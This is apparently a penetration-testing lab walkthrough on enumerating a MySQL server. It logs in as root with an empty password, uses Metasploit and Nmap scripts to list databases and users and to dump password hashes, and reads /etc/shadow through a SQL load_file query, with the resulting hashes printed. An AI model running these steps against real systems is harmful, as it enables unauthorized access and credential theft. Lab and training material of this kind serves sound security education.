# MySQL

Now we will enumerate MySQL database.

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 07:53 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000047s latency).

PORT     STATE SERVICE VERSION
<strong>3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
</strong>MAC Address: 02:42:C0:15:A1:03 (Unknown)
</code></pre>

Let's see if we can log in to MySQL as root:

```sh
root@attackdefense:~# mysql -h 192.21.161.3 -u root
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 44
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

it looks like we logged in.

To show databases, we can use the following command:

```sh
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| books              |
| data               |
| mysql              |
| password           |
| performance_schema |
| secret             |
| store              |
| upload             |
| vendors            |
| videos             |
+--------------------+
11 rows in set (0.001 sec)
```

To select a database, we can use the following command:

```sh
MySQL [(none)]> use books
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [books]> 
```

To count the number of authors in the books database, we can use the following command:

```sh
MySQL [books]> select count(*) from authors;
+----------+
| count(*) |
+----------+
|       10 |
+----------+
1 row in set (0.001 sec)
```

To see everything in the database, we can use the following command:

```sh
MySQL [books]> select * from authors;
+----+------------+-----------+-----------------------------+------------+---------------------+
| id | first_name | last_name | email                       | birthdate  | added               |
+----+------------+-----------+-----------------------------+------------+---------------------+
|  1 | Gregoria   | Lowe      | gutmann.rebekah@example.net | 1982-03-09 | 1983-01-11 11:25:43 |
|  2 | Ona        | Anderson  | ethelyn02@example.net       | 1980-06-02 | 1972-05-05 07:26:52 |
|  3 | Emile      | Lakin     | rippin.freda@example.com    | 1979-04-06 | 2010-05-30 20:03:07 |
|  4 | Raul       | Barton    | mschiller@example.com       | 1976-05-06 | 1979-02-08 12:32:29 |
|  5 | Sofia      | Collier   | rodrigo34@example.net       | 1978-06-09 | 1991-05-01 10:02:54 |
|  6 | Wellington | Fay       | jared98@example.com         | 2011-08-11 | 1992-05-27 23:20:20 |
|  7 | Garnet     | Braun     | hickle.howell@example.net   | 1990-04-27 | 2010-04-13 09:48:36 |
|  8 | Alessia    | Kuphal    | skiles.reggie@example.net   | 1978-04-06 | 2014-08-22 21:23:00 |
|  9 | Deven      | Carroll   | savanah.zulauf@example.net  | 2007-02-15 | 1998-02-16 11:45:32 |
| 10 | Issac      | Stanton   | ozella10@example.net        | 2013-10-13 | 1976-12-09 13:18:45 |
+----+------------+-----------+-----------------------------+------------+---------------------+
10 rows in set (0.000 sec)
```

We can also use Metasploit for MySQL enumeration:

To check which directories are writeable, we can use the following scanner:

<pre class="language-sh"><code class="lang-sh">msf5 > use auxiliary/scanner/mysql/mysql_writable_dirs 
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set dir_list /usr/share/metasploit-framework/data/wordlists/directory.txt
dir_list => /usr/share/metasploit-framework/data/wordlists/directory.txt
<strong>msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > <a data-footnote-ref href="#user-content-fn-1">setg</a> rhosts 192.21.161.3
</strong>rhosts => 192.21.161.3
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set verbose false
verbose => false
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > set password ""
password => 
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > run

[!] 192.21.161.3:3306     - For every writable directory found, a file called mhainVFF with the text test will be written to the directory.
[*] 192.21.161.3:3306     - Login...
[*] 192.21.161.3:3306     - Checking /tmp...
[+] 192.21.161.3:3306     - /tmp is writeable
[*] 192.21.161.3:3306     - Checking /etc/passwd...
[!] 192.21.161.3:3306     - Can't create/write to file '/etc/passwd/mhainVFF' (Errcode: 20)
[*] 192.21.161.3:3306     - Checking /etc/shadow...
[!] 192.21.161.3:3306     - Can't create/write to file '/etc/shadow/mhainVFF' (Errcode: 20)
[*] 192.21.161.3:3306     - Checking /root...
[+] 192.21.161.3:3306     - /root is writeable
.
.
</code></pre>

**setg** is used to declare the rhosts as global so that we don't have to specify it repeatedly in a single session.

Another scanner that we can use is hashdump:

```sh
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > use auxiliary/scanner/mysql/mysql_hashdump 
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set username root
username => root
msf5 auxiliary(scanner/mysql/mysql_hashdump) > set password ""
password => 
msf5 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
[+] 192.21.161.3:3306     - Saving HashString as Loot: root:
[+] 192.21.161.3:3306     - Saving HashString as Loot: filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.21.161.3:3306     - Saving HashString as Loot: ultra:*827EC562775DC9CE458689D36687DCED320F34B0
[+] 192.21.161.3:3306     - Saving HashString as Loot: guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.21.161.3:3306     - Saving HashString as Loot: sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.21.161.3:3306     - Saving HashString as Loot: udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.21.161.3:3306     - Saving HashString as Loot: sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
[*] 192.21.161.3:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Here we got a bunch of hashes of different users.

Let's again jump into MySQL and see if we have some access to internal sensitive files:

```sh
MySQL [(none)]> select load_file("/etc/shadow");
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| load_file("/etc/shadow")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::
daemon:*:17850:0:99999:7:::
bin:*:17850:0:99999:7:::
sys:*:17850:0:99999:7:::
sync:*:17850:0:99999:7:::
games:*:17850:0:99999:7:::
man:*:17850:0:99999:7:::
lp:*:17850:0:99999:7:::
mail:*:17850:0:99999:7:::
news:*:17850:0:99999:7:::
uucp:*:17850:0:99999:7:::
proxy:*:17850:0:99999:7:::
www-data:*:17850:0:99999:7:::
backup:*:17850:0:99999:7:::
list:*:17850:0:99999:7:::
irc:*:17850:0:99999:7:::
gnats:*:17850:0:99999:7:::
nobody:*:17850:0:99999:7:::
libuuid:!:17850:0:99999:7:::
syslog:*:17850:0:99999:7:::
mysql:!:17857:0:99999:7:::
dbadmin:$6$vZ3Fv3x6$qdB/lOAC1EtlKEC2H8h5f7t33j65WDbHHV50jloFkxFBeQC8QkdbQKpHEp/BkVMQD2C2AFPkYW3.W7jMlMbl5.:17861:0:99999:7:::
```

Let's now try Nmap.

To check if there is any other user with an empty password rather than root, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-empty-password
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:26 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000042s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-empty-password: 
|_  root account has empty password
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

To get more info about the database using Nmap, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-info          
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:27 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000039s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.62-0ubuntu0.14.04.1
|   Thread ID: 52
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, ConnectWithDatabase, LongColumnFlag, SupportsLoadDataLocal, Support41Auth, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, Speaks41ProtocolOld, FoundRows, ODBCClient, IgnoreSpaceBeforeParenthesis, InteractiveClient, SupportsCompression, LongPassword, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: xI@G$z_L?5,zD$(;/w0$
|_  Auth Plugin Name: 96
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

To look for users using Nmap, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-users --script-args="mysqluser='root',mysqlpass=''";
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:32 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000042s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-users: 
|   filetest
|   root
|   debian-sys-maint
|   guest
|   sigver
|   sysadmin
|   udadmin
|_  ultra
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

To look for databases using Nmap, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''";
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:37 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000075s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-databases: 
|   information_schema
|   books
|   data
|   mysql
|   password
|   performance_schema
|   secret
|   store
|   upload
|   vendors
|_  videos
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

To look for MySQL variables, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:39 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000036s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-variables: 
|   auto_increment_increment: 1
|   auto_increment_offset: 1
|   autocommit: ON
|   automatic_sp_privileges: ON
|   back_log: 50
|   basedir: /usr
|   big_tables: OFF
|   binlog_cache_size: 32768
|   binlog_direct_non_transactional_updates: OFF
|   binlog_format: STATEMENT
|   binlog_stmt_cache_size: 32768
|   bulk_insert_buffer_size: 8388608
|   character_set_client: latin1
|   character_set_connection: latin1
|   character_set_database: latin1
|   character_set_filesystem: binary
|   character_set_results: latin1
|   character_set_server: latin1
|   character_set_system: utf8
|   character_sets_dir: /usr/share/mysql/charsets/
.
.
```

To audit the MySQL database, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:48 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000036s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-audit: 
|   CIS MySQL Benchmarks v1.0.2
|       3.1: Skip symbolic links => FAIL
|       3.2: Logs not on system partition => PASS
|       3.2: Logs not on database partition => PASS
|       4.1: Supported version of MySQL => REVIEW
|         Version: 5.5.62-0ubuntu0.14.04.1
|       4.4: Remove test database => PASS
|       4.5: Change admin account name => PASS
|       4.7: Verify Secure Password Hashes => PASS
|       4.9: Wildcards in user hostname => PASS
|         The following users were found with wildcards in hostname
|           filetest
|           root
|       4.10: No blank passwords => PASS
|         The following users were found having blank/empty passwords
|           root
|       4.11: Anonymous account => PASS
|       5.1: Access to mysql database => REVIEW
|         Verify the following users that have access to the MySQL database
|           user  host
|       5.2: Do not grant FILE privileges to non Admin users => PASS
|         The following users were found having the FILE privilege
|           filetest
|       5.3: Do not grant PROCESS privileges to non Admin users => PASS
|       5.4: Do not grant SUPER privileges to non Admin users => PASS
|       5.5: Do not grant SHUTDOWN privileges to non Admin users => PASS
|       5.6: Do not grant CREATE USER privileges to non Admin users => PASS
|       5.7: Do not grant RELOAD privileges to non Admin users => PASS
|       5.8: Do not grant GRANT privileges to non Admin users => PASS
|       6.2: Disable Load data local => FAIL
|       6.3: Disable old password hashing => FAIL
|       6.4: Safe show database => FAIL
|       6.5: Secure auth => FAIL
|       6.6: Grant tables => FAIL
|       6.7: Skip merge => FAIL
|       6.8: Skip networking => FAIL
|       6.9: Safe user create => FAIL
|       6.10: Skip symbolic links => FAIL
|     
|     Additional information
|       The audit was performed using the db-account: root
|_      The following admin accounts were excluded from the audit: root,debian-sys-maint
```

To dump the hashes using Nmap, we can use the following command:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-dump-hashes --script-args="username='root',password=''"
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:52 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000038s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-dump-hashes: 
|   debian-sys-maint:*CDDA79A15EF590ED57BB5933ECD27364809EE90D
|   filetest:*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
|   ultra:*827EC562775DC9CE458689D36687DCED320F34B0
|   guest:*17FD2DDCC01E0E66405FB1BA16F033188D18F646
|   sigver:*027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
|   udadmin:*E6DEAD2645D88071D28F004A209691AC60A72AC9
|_  sysadmin:*46CFC7938B60837F46B610A2D10C248874555C14
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

We can also use Nmap to run a query:

```sh
root@attackdefense:~# nmap 192.21.161.3 -p3306 -sV --script=mysql-query --script-args="query='select count(*) from books.authors;',username='root',password=''"
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-29 08:56 UTC
Nmap scan report for target-1 (192.21.161.3)
Host is up (0.000041s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1
| mysql-query: 
|   count(*)
|   10
|   
|   Query: select count(*) from books.authors;
|_  User: root
MAC Address: 02:42:C0:15:A1:03 (Unknown)
```

[^1]: setg is used to declare the rhosts as global so that we don't have to specify it again and again in a single session.
